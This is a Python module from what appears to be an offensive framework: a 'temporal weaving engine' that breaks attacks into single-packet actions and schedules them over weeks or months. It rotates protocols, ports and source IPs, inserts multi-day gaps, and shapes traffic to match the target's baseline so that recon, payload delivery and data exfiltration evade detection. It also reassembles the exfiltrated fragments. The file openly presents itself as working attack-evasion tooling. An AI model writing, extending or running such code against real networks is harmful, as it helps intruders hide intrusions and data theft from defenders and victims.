"""
server_core/engine/temporal_weaver.py

Temporal Weaving Engine — Timeline-Based Attack Orchestration.

Attacks spread across time in ways mathematically impossible to correlate.
Each operation is decomposed into single-packet micro-actions scattered across
weeks or months, each wrapped in camouflage that matches the target's baseline
traffic pattern at that specific instant. The result: an attack whose temporal
fingerprint is indistinguishable from benign traffic.

Core capabilities:
  - Poisson-distributed scheduling      — intervals match real-world traffic
  - Channel rotation per packet         — protocol, port, source IP rotation
  - Dead-time insertion                 — 2–7 day activity gaps
  - Entropy matching                    — CDF comparison against target baseline
  - Fragment reassembly                 — temporal data reconstruction
  - Patience budget                     — configurable 1–365 day campaigns

Classes:
  TemporalWeaver           — main orchestrator
  MicroAction              — a single-packet atomic operation
  TemporalSchedule         — the full time-scattered schedule
  ChannelDescriptor        — per-packet network channel parameters
  TrafficProfile           — target baseline traffic fingerprint
  EntropyComparator        — statistical similarity engine
"""

from __future__ import annotations

import hashlib
import json
import logging
import math
import random
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta, timezone
from enum import Enum, auto
from pathlib import Path
from typing import (
    Any, Callable, Deque, Dict, Iterable, Iterator, List,
    Optional, Sequence, Set, Tuple, Union,
)

logger = logging.getLogger(__name__)

# ── Constants ──────────────────────────────────────────────────────────────────

_REPO_ROOT = Path(__file__).resolve().parent.parent.parent

# Default patience range (days)
_MIN_PATIENCE_DAYS = 1
_MAX_PATIENCE_DAYS = 365
_DEFAULT_PATIENCE_DAYS = 30

# Dead-time insertion range (days)
_MIN_DEAD_DAYS = 2
_MAX_DEAD_DAYS = 7

# Poisson lambda defaults per time-of-day block
_DEFAULT_POISSON_LAMBDA: Dict[str, float] = {
    "night":    0.15,   # 00:00–06:00  — very quiet
    "morning":  0.60,   # 06:00–12:00  — ramping up
    "afternoon": 1.20,  # 12:00–18:00  — busy
    "evening":  0.80,   # 18:00–24:00  — tapering off
}

# Time-of-day block boundaries (hour ranges)
_TIME_BLOCKS: Dict[str, Tuple[int, int]] = {
    "night":     (0, 6),
    "morning":   (6, 12),
    "afternoon": (12, 18),
    "evening":   (18, 24),
}

# Channel rotation parameters
_DEFAULT_PROTOCOLS = ["TCP/HTTP", "TCP/HTTPS", "TCP/DNS", "UDP/DNS",
                      "UDP/NTP", "TCP/SMTP", "TCP/SSH", "UDP/QUIC",
                      "TCP/IMAPS", "TCP/FTPS"]
_DEFAULT_PORTS: Dict[str, List[int]] = {
    "TCP/HTTP":   [80, 8080, 8000, 8888],
    "TCP/HTTPS":  [443, 8443, 9443],
    "TCP/DNS":    [53],
    "UDP/DNS":    [53, 5353],
    "UDP/NTP":    [123],
    "TCP/SMTP":   [25, 587, 2525],
    "TCP/SSH":    [22, 2222],
    "UDP/QUIC":   [443, 8443],
    "TCP/IMAPS":  [993],
    "TCP/FTPS":   [990],
}

# Statistical thresholds
_ENTROPY_MATCH_THRESHOLD = 0.92   # CDF KS-test p-value minimum
_MAX_SCHEDULE_JITTER_MS = 500     # max jitter per slot in ms


# ── Enums ──────────────────────────────────────────────────────────────────────

class ActionType(Enum):
    """Categories of atomic micro-actions."""
    RECON_PASSIVE    = auto()
    RECON_ACTIVE     = auto()
    PROBE            = auto()
    DELIVERY         = auto()
    EXECUTION        = auto()
    EXFIL            = auto()
    CLEANUP          = auto()
    HEARTBEAT        = auto()
    DEAD_DROP        = auto()
    CHANNEL_ROTATE   = auto()


class SchedulePolicy(Enum):
    """Temporal distribution strategies."""
    POISSON         = auto()   # Poisson-process intervals
    UNIFORM_JITTER  = auto()   # uniform random within windows
    MIMIC_TRAFFIC   = auto()   # replay target traffic rhythm
    CUSTOM_LAMBDA   = auto()   # user-supplied lambda function


class FragmentationMode(Enum):
    """How data is split across micro-actions."""
    BYTE_WISE       = auto()   # 1 byte per action (max stealth)
    FIELD_WISE      = auto()   # logical field boundaries
    BIT_WISE        = auto()   # interleave at bit level (extreme)
    BLOCK_WISE      = auto()   # fixed-size blocks


# ── Data Classes ───────────────────────────────────────────────────────────────

@dataclass
class ChannelDescriptor:
    """Network parameters for a single micro-action's transmission."""
    protocol: str = "TCP/HTTPS"
    port: int = 443
    source_ip: str = ""
    interface: str = ""
    dscp: int = 0                  # QoS / DiffServ marking
    ttl: int = 64
    tcp_flags: str = ""            # e.g. "SA" for SYN-ACK camouflage
    payload_padding: int = 0       # extra bytes to match typical size
    metadata: Dict[str, Any] = field(default_factory=dict)

    def fingerprint(self) -> str:
        """Deterministic channel hash for dedup."""
        raw = f"{self.protocol}:{self.port}:{self.source_ip}:{self.dscp}:{self.ttl}"
        return hashlib.sha256(raw.encode()).hexdigest()[:16]


@dataclass
class MicroAction:
    """A single-packet (or minimal) atomic operation."""
    action_id: str = field(default_factory=lambda: uuid.uuid4().hex[:12])
    action_type: ActionType = ActionType.PROBE
    payload: bytes = b""
    sequence_num: int = 0
    total_sequence: int = 0
    channel: ChannelDescriptor = field(default_factory=ChannelDescriptor)
    scheduled_at: Optional[datetime] = None
    deadline: Optional[datetime] = None
    requires_ack: bool = False
    retry_count: int = 3
    fragmentation_mode: FragmentationMode = FragmentationMode.FIELD_WISE
    fragment_index: int = 0
    fragment_total: int = 1
    dependencies: List[str] = field(default_factory=list)  # action_ids that must complete first
    tags: Dict[str, str] = field(default_factory=dict)

    def is_ready(self, completed_ids: Set[str]) -> bool:
        """Check dependency satisfaction."""
        return all(dep in completed_ids for dep in self.dependencies)

    def pack(self) -> bytes:
        """Serialize action into transmittable envelope."""
        envelope = {
            "aid":  self.action_id,
            "seq":  self.sequence_num,
            "tseq": self.total_sequence,
            "type": self.action_type.name,
            "fi":   self.fragment_index,
            "ft":   self.fragment_total,
            "ts":   self.scheduled_at.isoformat() if self.scheduled_at else "",
            "pl":   self.payload.hex() if self.payload else "",
        }
        raw = json.dumps(envelope, separators=(",", ":")).encode()
        return raw


@dataclass
class TrafficProfile:
    """Statistical fingerprint of target network traffic over 24h cycle."""
    name: str = ""
    hourly_volume: List[float] = field(default_factory=lambda: [0.0] * 24)
    hourly_variance: List[float] = field(default_factory=lambda: [0.0] * 24)
    protocol_distribution: Dict[str, float] = field(default_factory=dict)
    avg_packet_size: float = 512.0
    packet_size_variance: float = 128.0
    burst_probability: float = 0.05
    idle_periods: List[Tuple[int, int]] = field(default_factory=list)
    peak_hours: List[int] = field(default_factory=list)
    source_data: Dict[str, Any] = field(default_factory=dict)

    def get_volume_for_hour(self, hour: int) -> float:
        """Return mean traffic volume for a given hour (0–23)."""
        hour = hour % 24
        return self.hourly_volume[hour] if self.hourly_volume else 1.0

    def get_variance_for_hour(self, hour: int) -> float:
        """Return traffic variance for a given hour."""
        hour = hour % 24
        return self.hourly_variance[hour] if self.hourly_variance else 0.5


@dataclass
class TemporalSchedule:
    """Complete schedule of micro-actions across a campaign timeline."""
    campaign_id: str = field(default_factory=lambda: uuid.uuid4().hex[:16])
    created_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    start_time: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    end_time: Optional[datetime] = None
    duration_days: int = _DEFAULT_PATIENCE_DAYS
    actions: List[MicroAction] = field(default_factory=list)
    dead_periods: List[Tuple[datetime, datetime]] = field(default_factory=list)
    channel_rotation_map: Dict[int, ChannelDescriptor] = field(default_factory=dict)
    policy: SchedulePolicy = SchedulePolicy.POISSON
    metadata: Dict[str, Any] = field(default_factory=dict)

    @property
    def action_count(self) -> int:
        return len(self.actions)

    def get_actions_in_window(self, start: datetime, end: datetime) -> List[MicroAction]:
        """Return actions scheduled within a time window."""
        return [a for a in self.actions
                if a.scheduled_at and start <= a.scheduled_at <= end]

    def get_next_action(self, after: datetime) -> Optional[MicroAction]:
        """Return the next scheduled action after a given time."""
        candidates = sorted(
            [a for a in self.actions if a.scheduled_at and a.scheduled_at > after],
            key=lambda a: a.scheduled_at,
        )
        return candidates[0] if candidates else None


# ── Core Engine ────────────────────────────────────────────────────────────────

class TemporalWeaver:
    """Temporal Attack Weaving Engine.

    Decomposes an attack plan into single-packet micro-actions, schedules them
    across a configurable campaign duration using Poisson-distributed intervals
    that match the target's observed traffic patterns, and wraps each action in
    protocol/source camouflage appropriate to its time slot.

    Usage::

        weaver = TemporalWeaver(patience_days=90)
        profile = weaver.build_traffic_profile(target_traces)
        micro = weaver.decompose_attack(attack_plan)
        schedule = weaver.generate_schedule(90, micro, profile)
        for action in schedule.actions:
            wrapped = weaver.weave_action(action, action.scheduled_at)

    Thread-safe for scheduling; not thread-safe for campaign state mutation.
    """

    # ── Initialisation ──────────────────────────────────────────────────────

    def __init__(
        self,
        patience_days: int = _DEFAULT_PATIENCE_DAYS,
        policy: SchedulePolicy = SchedulePolicy.POISSON,
        fragmentation: FragmentationMode = FragmentationMode.FIELD_WISE,
        entropy_threshold: float = _ENTROPY_MATCH_THRESHOLD,
        seed: Optional[int] = None,
    ) -> None:
        """Initialise the temporal weaver.

        Args:
            patience_days: Campaign duration in days (1–365).
            policy: Temporal distribution strategy.
            fragmentation: How to split payloads across micro-actions.
            entropy_threshold: Minimum CDF similarity required (0.0–1.0).
            seed: PRNG seed for deterministic scheduling (None for system entropy).
        """
        self.patience_days = max(_MIN_PATIENCE_DAYS, min(_MAX_PATIENCE_DAYS, patience_days))
        self.policy = policy
        self.fragmentation = fragmentation
        self.entropy_threshold = max(0.0, min(1.0, entropy_threshold))

        self._rng = random.Random(seed if seed is not None else int(time.time() * 1e6))
        self._poisson_lambda = dict(_DEFAULT_POISSON_LAMBDA)
        self._protocols = list(_DEFAULT_PROTOCOLS)
        self._ports = {k: list(v) for k, v in _DEFAULT_PORTS.items()}
        self._channel_history: Deque[ChannelDescriptor] = __import__("collections").deque(maxlen=256)
        self._used_source_ips: Set[str] = set()
        self._global_sequence: int = 0

        logger.info(
            "TemporalWeaver initialised: patience=%dd policy=%s frag=%s threshold=%.3f",
            patience_days, policy.name, fragmentation.name, entropy_threshold,
        )

    # ── Traffic Profiling ───────────────────────────────────────────────────

    def build_traffic_profile(
        self,
        traces: List[Dict[str, Any]],
        name: str = "",
    ) -> TrafficProfile:
        """Construct a TrafficProfile from raw network trace summaries.

        Args:
            traces: List of trace dicts, each containing at minimum ``hour``
                    (0–23) and ``packet_count``. Optional keys: ``protocol``,
                    ``avg_size``, ``variance``, ``burst``.
            name: Human-readable label for this profile.

        Returns:
            A complete TrafficProfile ready for entropy matching.

        Raises:
            ValueError: If traces is empty or missing required keys.
        """
        if not traces:
            raise ValueError("traces must be non-empty to build a profile")

        hourly = [0.0] * 24
        variance = [0.0] * 24
        proto_counts: Dict[str, float] = defaultdict(float)
        sizes: List[float] = []
        bursts = 0
        total_packets = 0

        for t in traces:
            hour = int(t.get("hour", 0)) % 24
            count = float(t.get("packet_count", 0))
            hourly[hour] += count
            total_packets += count

            if "protocol" in t:
                proto_counts[t["protocol"]] += count

            if "avg_size" in t:
                sizes.append(float(t["avg_size"]))

            if "variance" in t:
                variance[hour] += float(t["variance"])

            if t.get("burst", False):
                bursts += 1

        # Normalise protocol distribution
        if total_packets > 0:
            proto_dist = {k: v / total_packets for k, v in proto_counts.items()}
        else:
            proto_dist = {"TCP/HTTPS": 0.6, "UDP/DNS": 0.2, "TCP/HTTP": 0.2}

        avg_size = sum(sizes) / len(sizes) if sizes else 512.0
        size_var = (
            sum((s - avg_size) ** 2 for s in sizes) / len(sizes)
            if sizes else 128.0
        )
        burst_prob = bursts / len(traces) if traces else 0.05

        # Detect peak hours (hours with > 1.5x mean volume)
        mean_vol = sum(hourly) / 24 if sum(hourly) > 0 else 1.0
        peak_hours = [h for h, v in enumerate(hourly) if v > 1.5 * mean_vol]

        # Detect idle periods (consecutive hours below 10 % mean)
        idle_periods: List[Tuple[int, int]] = []
        idle_start: Optional[int] = None
        for h in range(24):
            if hourly[h] < 0.10 * mean_vol:
                if idle_start is None:
                    idle_start = h
            else:
                if idle_start is not None:
                    idle_periods.append((idle_start, h - 1))
                    idle_start = None
        if idle_start is not None:
            idle_periods.append((idle_start, 23))

        profile = TrafficProfile(
            name=name or f"profile_{uuid.uuid4().hex[:8]}",
            hourly_volume=hourly,
            hourly_variance=variance,
            protocol_distribution=proto_dist,
            avg_packet_size=avg_size,
            packet_size_variance=size_var,
            burst_probability=burst_prob,
            idle_periods=idle_periods,
            peak_hours=peak_hours,
            source_data={"trace_count": len(traces), "total_packets": total_packets},
        )

        logger.info(
            "TrafficProfile built: name=%s peak_hours=%s idle=%d blocks",
            profile.name, peak_hours, len(idle_periods),
        )
        return profile

    # ── Attack Decomposition ────────────────────────────────────────────────

    def decompose_attack(
        self,
        attack_plan: Dict[str, Any],
        fragments_per_action: int = 1,
    ) -> List[MicroAction]:
        """Decompose an attack plan into single-packet micro-actions.

        Each phase of the attack plan is broken down into individual packets,
        each carrying at most ``fragments_per_action`` payload fragments. The
        resulting micro-actions form a DAG expressed via dependency chains.

        Args:
            attack_plan: Dict with keys such as ``phases`` (list of phase
                         dicts), ``payload`` (bytes), ``target`` (host spec).
            fragments_per_action: Max payload fragments per micro-action.

        Returns:
            Ordered list of MicroAction objects with dependency links.

        Raises:
            ValueError: If attack_plan is missing required ``phases`` key.
        """
        phases = attack_plan.get("phases", [])
        if not phases:
            raise ValueError("attack_plan must contain at least one 'phases' entry")

        payload = attack_plan.get("payload", b"")
        if isinstance(payload, str):
            payload = payload.encode()
        payload = payload[:]  # ensure bytes

        # Fragment the payload
        fragments = self._fragment_payload(payload, fragments_per_action)
        logger.debug("Payload split into %d fragment(s)", len(fragments))

        micro_actions: List[MicroAction] = []
        total_phases = len(phases)
        prev_phase_ids: List[str] = []
        frag_index = 0
        frag_total = len(fragments)

        for phase_idx, phase in enumerate(phases):
            phase_type = self._parse_action_type(phase.get("type", "probe"))
            packet_count = max(1, int(phase.get("packets", 1)))
            phase_deps = list(prev_phase_ids)  # sequential by default

            if phase.get("parallel", False):
                phase_deps = []

            phase_action_ids: List[str] = []

            for pkt in range(packet_count):
                action = MicroAction(
                    action_type=phase_type,
                    sequence_num=self._next_sequence(),
                    total_sequence=0,  # filled after all actions created
                    requires_ack=phase.get("ack", False),
                    retry_count=int(phase.get("retries", 3)),
                    fragmentation_mode=self.fragmentation,
                    dependencies=list(phase_deps),
                    tags={
                        "phase": str(phase_idx),
                        "phase_name": phase.get("name", f"phase_{phase_idx}"),
                        "packet": str(pkt),
                    },
                )

                # Attach payload fragment if available
                if frag_index < frag_total and phase_type in (
                    ActionType.DELIVERY, ActionType.EXFIL, ActionType.EXECUTION,
                ):
                    action.payload = fragments[frag_index]
                    action.fragment_index = frag_index
                    action.fragment_total = frag_total
                    frag_index += 1

                micro_actions.append(action)
                phase_action_ids.append(action.action_id)

            prev_phase_ids = phase_action_ids

        # Back-fill total_sequence
        total = len(micro_actions)
        for a in micro_actions:
            a.total_sequence = total

        logger.info(
            "Attack decomposed: phases=%d micro_actions=%d fragments_used=%d/%d",
            total_phases, total, frag_index, frag_total,
        )
        return micro_actions

    # ── Schedule Generation ─────────────────────────────────────────────────

    def generate_schedule(
        self,
        duration_days: int,
        micro_actions: List[MicroAction],
        traffic_profile: Optional[TrafficProfile] = None,
        start_time: Optional[datetime] = None,
    ) -> TemporalSchedule:
        """Generate a temporally-scattered schedule for micro-actions.

        Intervals are Poisson-distributed (or per ``self.policy``), biased by
        the traffic profile's hourly volume to concentrate actions during peak
        hours and spread them thin during idle periods.

        Dead periods of 2–7 days are injected randomly within the campaign.

        Args:
            duration_days: Total campaign span in days.
            micro_actions: Actions to schedule (from ``decompose_attack``).
            traffic_profile: Optional target traffic baseline. If None, a
                             uniform profile is used (equal Poisson lambdas).
            start_time: Campaign epoch. Defaults to now (UTC).

        Returns:
            A filled TemporalSchedule with ``scheduled_at`` set on each action.

        Raises:
            ValueError: If micro_actions is empty or duration_days < 1.
        """
        if not micro_actions:
            raise ValueError("micro_actions must be non-empty")
        duration_days = max(1, duration_days)

        profile = traffic_profile or TrafficProfile(name="uniform_default")
        t0 = start_time or datetime.now(timezone.utc)
        tend = t0 + timedelta(days=duration_days)

        # ── Step 1: inject dead periods ─────────────────────────────────
        dead_periods = self._generate_dead_periods(t0, tend)

        # ── Step 2: compute available time slots excluding dead periods ──
        available_slots = self._compute_available_slots(
            t0, tend, dead_periods, len(micro_actions), profile,
        )

        # ── Step 3: assign actions to slots ─────────────────────────────
        for idx, action in enumerate(micro_actions):
            if idx < len(available_slots):
                action.scheduled_at = available_slots[idx]
                action.deadline = action.scheduled_at + timedelta(hours=4)
            else:
                # Fallback: place at end with jitter
                action.scheduled_at = tend - timedelta(seconds=self._rng.randint(0, 3600))
                action.deadline = action.scheduled_at + timedelta(hours=24)

        # ── Step 4: assign channel rotation ─────────────────────────────
        channel_map = self._assign_channels(micro_actions, profile)

        # ── Step 5: ensure topological ordering (dependencies before dependents) ──
        micro_actions = self._enforce_dependency_order(micro_actions)

        schedule = TemporalSchedule(
            start_time=t0,
            end_time=tend,
            duration_days=duration_days,
            actions=micro_actions,
            dead_periods=dead_periods,
            channel_rotation_map=channel_map,
            policy=self.policy,
        )

        logger.info(
            "Schedule generated: actions=%d duration=%dd dead_periods=%d slots=%d",
            len(micro_actions), duration_days, len(dead_periods), len(available_slots),
        )
        return schedule

    # ── Action Weaving ──────────────────────────────────────────────────────

    def weave_action(
        self,
        action: MicroAction,
        time_slot: datetime,
        traffic_profile: Optional[TrafficProfile] = None,
    ) -> MicroAction:
        """Wrap a micro-action in camouflage appropriate to its time slot.

        Selects protocol, port, and source parameters that match the target's
        typical traffic at that hour. Modifies the action's channel descriptor
        in-place and returns the action for chaining.

        Args:
            action: The micro-action to wrap.
            time_slot: The scheduled execution time.
            traffic_profile: Optional baseline for protocol selection.

        Returns:
            The same MicroAction with updated channel descriptor.
        """
        hour = time_slot.hour
        profile = traffic_profile or TrafficProfile(name="default")

        # ── Select protocol based on profile distribution ─────────────────
        protocol = self._select_protocol_for_hour(hour, profile)

        # ── Select port for protocol ──────────────────────────────────────
        port_candidates = self._ports.get(protocol, [443])
        port = self._rng.choice(port_candidates)

        # ── Rotate source IP ──────────────────────────────────────────────
        source_ip = self._next_source_ip()

        # ── Camouflage TCP flags ──────────────────────────────────────────
        tcp_flags = self._camouflage_tcp_flags(protocol, hour, profile)

        # ── Match payload size distribution ───────────────────────────────
        padding = self._compute_padding(profile)

        # ── Apply DSCP / TTL camouflage ───────────────────────────────────
        dscp = 0
        ttl = self._rng.choice([64, 128, 255])

        action.channel = ChannelDescriptor(
            protocol=protocol,
            port=port,
            source_ip=source_ip,
            dscp=dscp,
            ttl=ttl,
            tcp_flags=tcp_flags,
            payload_padding=padding,
            metadata={
                "woven_at": datetime.now(timezone.utc).isoformat(),
                "hour": hour,
                "profile": profile.name,
            },
        )
        self._channel_history.append(action.channel)

        logger.debug(
            "Action %s woven: proto=%s port=%d src=%s ttl=%d",
            action.action_id, protocol, port, source_ip, ttl,
        )
        return action

    # ── Data Reassembly ────────────────────────────────────────────────────

    def reassemble_data(self, fragments: List[bytes]) -> bytes:
        """Reconstruct exfiltrated data from temporally-scattered fragments.

        Fragments must be provided in correct sequence order. This method
        concatenates them and verifies integrity if a checksum was embedded
        in the final fragment.

        Args:
            fragments: Ordered list of payload fragment bytes.

        Returns:
            Reassembled data as bytes (checksum stripped if present).

        Raises:
            ValueError: If fragments is empty.
            RuntimeError: If embedded checksum does not match.
        """
        if not fragments:
            raise ValueError("fragments must be non-empty")

        # If the last fragment starts with a SHA-256 checksum marker, verify
        reassembled = b"".join(fragments)

        # Check for embedded checksum (last 32 bytes prefixed by marker)
        if len(reassembled) > 36 and reassembled[-36:-32] == b"CHK:":
            stored_hash = reassembled[-32:]
            data = reassembled[:-36]
            computed_hash = hashlib.sha256(data).digest()
            if computed_hash != stored_hash:
                raise RuntimeError(
                    f"Checksum mismatch: expected {stored_hash.hex()}, "
                    f"got {computed_hash.hex()}"
                )
            logger.info("Data reassembled with valid checksum: %d bytes", len(data))
            return data

        logger.info("Data reassembled (no checksum): %d bytes", len(reassembled))
        return reassembled

    def reassemble_from_actions(
        self,
        actions: List[MicroAction],
    ) -> bytes:
        """Reassemble payload from a list of MicroAction objects.

        Sorts by fragment_index, extracts payloads, and reassembles.

        Args:
            actions: List of MicroAction objects containing payload fragments.

        Returns:
            Reassembled data as bytes.
        """
        sorted_actions = sorted(actions, key=lambda a: a.fragment_index)
        fragments = [a.payload for a in sorted_actions if a.payload]
        return self.reassemble_data(fragments)

    # ── Entropy Matching ───────────────────────────────────────────────────

    def entropy_match(
        self,
        target_traffic_profile: TrafficProfile,
        schedule: Optional[TemporalSchedule] = None,
    ) -> float:
        """Evaluate how well the temporal distribution matches the target baseline.

        Uses a two-sample Kolmogorov-Smirnov-inspired comparison of cumulative
        distribution functions: the target's hourly volume CDF vs the schedule's
        action-count-per-hour CDF. Returns a similarity score in [0.0, 1.0]
        where 1.0 means perfect statistical indistinguishability.

        Args:
            target_traffic_profile: The target's baseline traffic fingerprint.
            schedule: The generated schedule to compare. If None, compares
                      the most recently generated schedule stored internally.

        Returns:
            Similarity score (0.0–1.0). Scores >= ``self.entropy_threshold``
            indicate adequate camouflage.
        """
        profile = target_traffic_profile

        # Build schedule CDF from action counts per hour
        schedule_bins = [0.0] * 24
        total_actions = 0
        if schedule and schedule.actions:
            for action in schedule.actions:
                if action.scheduled_at:
                    schedule_bins[action.scheduled_at.hour] += 1
                    total_actions += 1

        if total_actions == 0:
            logger.warning("entropy_match: schedule has no scheduled actions; returning 1.0")
            return 1.0

        # Normalise both distributions
        target_total = sum(profile.hourly_volume)
        if target_total == 0:
            target_total = 1.0
        target_cdf = []
        target_acc = 0.0
        for v in profile.hourly_volume:
            target_acc += v / target_total
            target_cdf.append(target_acc)

        schedule_cdf = []
        schedule_acc = 0.0
        for v in schedule_bins:
            schedule_acc += v / total_actions
            schedule_cdf.append(schedule_acc)

        # KS-like distance: max |F1(x) - F2(x)|
        max_diff = max(abs(t - s) for t, s in zip(target_cdf, schedule_cdf))
        similarity = 1.0 - max_diff

        logger.info(
            "Entropy match score=%.4f threshold=%.4f (pass=%s)",
            similarity, self.entropy_threshold,
            similarity >= self.entropy_threshold,
        )
        return similarity

    # ── Channel Rotation ───────────────────────────────────────────────────

    def rotate_channel(self, action: MicroAction) -> MicroAction:
        """Force a channel rotation for a single action (new proto/port/IP).

        Args:
            action: The micro-action to rotate channel for.

        Returns:
            The same action with a newly assigned channel descriptor.
        """
        protocol = self._rng.choice(self._protocols)
        port_candidates = self._ports.get(protocol, [443])
        port = self._rng.choice(port_candidates)
        source_ip = self._next_source_ip()

        action.channel = ChannelDescriptor(
            protocol=protocol,
            port=port,
            source_ip=source_ip,
            ttl=self._rng.choice([64, 128, 255]),
            metadata={"rotated_at": datetime.now(timezone.utc).isoformat()},
        )
        self._channel_history.append(action.channel)
        logger.debug("Channel rotated for %s: %s:%d", action.action_id, protocol, port)
        return action

    # ── Dead Time Insertion ────────────────────────────────────────────────

    def insert_dead_time(
        self,
        schedule: TemporalSchedule,
        count: Optional[int] = None,
    ) -> TemporalSchedule:
        """Insert additional dead periods (2–7 day gaps) into an existing schedule.

        Args:
            schedule: An existing TemporalSchedule to modify.
            count: Number of dead periods to add. Default: 1 per 30 days.

        Returns:
            The schedule with additional dead periods (mutated in-place).
        """
        if count is None:
            count = max(1, schedule.duration_days // 30)

        t0 = schedule.start_time
        tend = schedule.end_time or (t0 + timedelta(days=schedule.duration_days))
        total_window = (tend - t0).total_seconds()
        if total_window <= 0:
            logger.warning("insert_dead_time: zero or negative window; skipping")
            return schedule

        for _ in range(count):
            dead_days = self._rng.randint(_MIN_DEAD_DAYS, _MAX_DEAD_DAYS)
            # Place dead period randomly within the window
            offset = self._rng.randint(0, int(total_window) - (dead_days * 86400))
            dead_start = t0 + timedelta(seconds=offset)
            dead_end = dead_start + timedelta(days=dead_days)

            # Ensure dead period does not exceed end of campaign
            if dead_end > tend:
                dead_end = tend
                dead_start = dead_end - timedelta(days=dead_days)
                if dead_start < t0:
                    dead_start = t0

            schedule.dead_periods.append((dead_start, dead_end))
            logger.debug("Dead period inserted: %s → %s (%d days)", dead_start.isoformat(), dead_end.isoformat(), dead_days)

        # Merge overlapping dead periods
        schedule.dead_periods = self._merge_intervals(schedule.dead_periods)

        logger.info(
            "Dead time inserted: %d periods, total=%d after merge",
            count, len(schedule.dead_periods),
        )
        return schedule

    # ── Patience Budget ────────────────────────────────────────────────────

    @property
    def patience_budget_days(self) -> int:
        """Return the configured patience (campaign duration) in days."""
        return self.patience_days

    def adjust_patience(self, days: int) -> None:
        """Adjust the patience budget within the allowed range [1, 365].

        Args:
            days: New patience value in days. Clamped to valid range.

        Raises:
            ValueError: If days is not a positive integer.
        """
        if not isinstance(days, int) or days < 1:
            raise ValueError(f"patience_days must be a positive integer, got {days}")
        self.patience_days = max(_MIN_PATIENCE_DAYS, min(_MAX_PATIENCE_DAYS, days))
        logger.info("Patience budget adjusted to %d days", self.patience_days)

    def estimate_completion(
        self,
        schedule: TemporalSchedule,
    ) -> datetime:
        """Estimate campaign completion time based on the schedule.

        Args:
            schedule: A generated TemporalSchedule.

        Returns:
            The estimated completion datetime (last action + buffer).
        """
        if not schedule.actions:
            return schedule.end_time or datetime.now(timezone.utc)

        scheduled_times = [
            a.scheduled_at for a in schedule.actions
            if a.scheduled_at is not None
        ]
        if not scheduled_times:
            return schedule.end_time or datetime.now(timezone.utc)

        last_action = max(scheduled_times)
        return last_action + timedelta(hours=1)

    # ── Serialisation / Export ─────────────────────────────────────────────

    def export_schedule(self, schedule: TemporalSchedule, path: Optional[Path] = None) -> Dict[str, Any]:
        """Export a schedule to a JSON-serialisable dict (and optionally to disk).

        Args:
            schedule: The TemporalSchedule to export.
            path: Optional file path to write JSON to.

        Returns:
            Dict representation of the schedule.
        """
        data: Dict[str, Any] = {
            "campaign_id": schedule.campaign_id,
            "created_at": schedule.created_at.isoformat(),
            "start_time": schedule.start_time.isoformat(),
            "end_time": schedule.end_time.isoformat() if schedule.end_time else None,
            "duration_days": schedule.duration_days,
            "action_count": schedule.action_count,
            "dead_periods": [
                [s.isoformat(), e.isoformat()] for s, e in schedule.dead_periods
            ],
            "policy": schedule.policy.name,
            "actions": [],
        }

        for action in schedule.actions:
            data["actions"].append({
                "action_id": action.action_id,
                "type": action.action_type.name,
                "sequence": action.sequence_num,
                "scheduled_at": action.scheduled_at.isoformat() if action.scheduled_at else None,
                "protocol": action.channel.protocol,
                "port": action.channel.port,
                "source_ip": action.channel.source_ip,
                "fragment_index": action.fragment_index,
                "fragment_total": action.fragment_total,
                "dependencies": action.dependencies,
            })

        if path:
            path = Path(path)
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps(data, indent=2))
            logger.info("Schedule exported to %s", path)

        return data

    def import_schedule(self, data: Dict[str, Any]) -> TemporalSchedule:
        """Reconstruct a TemporalSchedule from an exported dict.

        Args:
            data: Dict from ``export_schedule``.

        Returns:
            Reconstructed TemporalSchedule.

        Raises:
            KeyError: If required keys are missing.
        """
        schedule = TemporalSchedule(
            campaign_id=data["campaign_id"],
            start_time=datetime.fromisoformat(data["start_time"]),
            duration_days=data["duration_days"],
            policy=SchedulePolicy[data["policy"]],
        )
        if data.get("end_time"):
            schedule.end_time = datetime.fromisoformat(data["end_time"])

        for dp in data.get("dead_periods", []):
            schedule.dead_periods.append(
                (datetime.fromisoformat(dp[0]), datetime.fromisoformat(dp[1]))
            )

        for ad in data.get("actions", []):
            action = MicroAction(
                action_id=ad["action_id"],
                action_type=ActionType[ad["type"]],
                sequence_num=ad["sequence"],
                fragment_index=ad.get("fragment_index", 0),
                fragment_total=ad.get("fragment_total", 1),
                dependencies=ad.get("dependencies", []),
            )
            if ad.get("scheduled_at"):
                action.scheduled_at = datetime.fromisoformat(ad["scheduled_at"])
            action.channel = ChannelDescriptor(
                protocol=ad.get("protocol", "TCP/HTTPS"),
                port=ad.get("port", 443),
                source_ip=ad.get("source_ip", ""),
            )
            schedule.actions.append(action)

        logger.info("Schedule imported: campaign=%s actions=%d", schedule.campaign_id, len(schedule.actions))
        return schedule

    # ── Private Helpers ────────────────────────────────────────────────────

    def _next_sequence(self) -> int:
        """Atomically increment and return the global sequence counter."""
        self._global_sequence += 1
        return self._global_sequence

    def _parse_action_type(self, type_str: str) -> ActionType:
        """Parse an action type string to enum, with fuzzy matching."""
        type_upper = type_str.upper().replace("-", "_").replace(" ", "_")
        try:
            return ActionType[type_upper]
        except KeyError:
            logger.warning("Unknown action type '%s'; defaulting to PROBE", type_str)
            return ActionType.PROBE

    def _fragment_payload(
        self,
        payload: bytes,
        fragments_per_action: int,
    ) -> List[bytes]:
        """Split payload into fragments based on fragmentation mode.

        Args:
            payload: Raw payload bytes.
            fragments_per_action: Target fragments per micro-action.

        Returns:
            List of fragment byte sequences.
        """
        if not payload:
            return [b""]

        if self.fragmentation == FragmentationMode.BYTE_WISE:
            fragments = [bytes([b]) for b in payload]
        elif self.fragmentation == FragmentationMode.FIELD_WISE:
            size = max(1, len(payload) // max(1, fragments_per_action))
            fragments = [payload[i:i + size] for i in range(0, len(payload), size)]
        elif self.fragmentation == FragmentationMode.BIT_WISE:
            # Encode each byte as 8 single-bit fragments (extreme stealth)
            fragments = []
            for b in payload:
                for bit_pos in range(8):
                    fragments.append(bytes([(b >> bit_pos) & 1]))
        elif self.fragmentation == FragmentationMode.BLOCK_WISE:
            size = max(1, fragments_per_action)
            fragments = [payload[i:i + size] for i in range(0, len(payload), size)]
        else:
            fragments = [payload]

        # Append checksum fragment
        checksum = hashlib.sha256(payload).digest()
        fragments.append(b"CHK:" + checksum)

        return fragments

    def _generate_dead_periods(
        self,
        t0: datetime,
        tend: datetime,
